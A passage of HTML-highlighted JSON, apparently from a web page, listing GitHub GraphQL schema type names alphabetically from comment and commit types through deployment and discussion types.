&#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommentCannotUpdateReason&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommentDeletedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Commit&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitAuthor&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitComment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitCommentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitCommentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitCommentThread&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitContributionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitContributionOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitContributionsByRepository&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitHistoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommitMessage&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CommittableBranch&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConnectedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Contribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionCalendar&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionCalendarDay&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionCalendarMonth&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionCalendarWeek&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionLevel&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ContributionsCollection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertProjectCardNoteToIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertProjectCardNoteToIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertPullRequestToDraftInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertPullRequestToDraftPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertToDraftEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertedNoteToIssueEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;ConvertedToDiscussionEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateBranchProtectionRuleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateBranchProtectionRulePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCheckRunInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCheckRunPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCheckSuiteInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCheckSuitePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCommitOnBranchInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateCommitOnBranchPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateEnterpriseOrganizationInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateEnterpriseOrganizationPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateEnvironmentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateEnvironmentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateIpAllowListEntryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateIpAllowListEntryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateMigrationSourceInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateMigrationSourcePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatePullRequestInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatePullRequestPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateRefInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateRefPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateRepositoryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateRepositoryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateSponsorsTierInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateSponsorsTierPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateSponsorshipInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateSponsorshipPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateTeamDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateTeamDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateTeamDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreateTeamDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedCommitContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedCommitContributionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedCommitContributionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedIssueContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedIssueContributionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedIssueContributionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedIssueOrRestrictedContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestContributionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestContributionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestOrRestrictedContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestReviewContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestReviewContributionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedPullRequestReviewContributionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedRepositoryContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedRepositoryContributionConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedRepositoryContributionEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CreatedRepositoryOrRestrictedContribution&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;CrossReferencedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Date&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DateTime&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeclineTopicSuggestionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeclineTopicSuggestionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DefaultRepositoryPermissionField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Deletable&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteBranchProtectionRuleInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteBranchProtectionRulePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDeploymentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDeploymentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteEnvironmentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteEnvironmentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIpAllowListEntryInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIpAllowListEntryPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIssueCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIssueCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIssueInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteIssuePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectCardInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectCardPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectColumnInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectColumnPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectNextItemInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectNextItemPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteProjectPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeletePullRequestReviewCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeletePullRequestReviewCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeletePullRequestReviewInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeletePullRequestReviewPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteRefInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteRefPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteTeamDiscussionCommentInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteTeamDiscussionCommentPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteTeamDiscussionInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteTeamDiscussionPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteVerifiableDomainInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeleteVerifiableDomainPayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DemilestonedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DependencyGraphEcosystem&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeployKey&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeployKeyConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeployKeyEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeployedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Deployment&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentEnvironmentChangedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentOrder&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentOrderField&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentProtectionRule&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentProtectionRuleConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentProtectionRuleEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentProtectionRuleType&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentRequest&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentRequestConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentRequestEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReview&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewer&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewerConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentReviewerEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentStatus&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentStatusConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentStatusEdge&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DeploymentStatusState&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiffSide&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DisablePullRequestAutoMergeInput&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DisablePullRequestAutoMergePayload&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DisconnectedEvent&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;Discussion&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionCategory&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span class="string">&quot;DiscussionCategoryConnection&quot;</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="attr">&quot;name&quot;</span>: <span 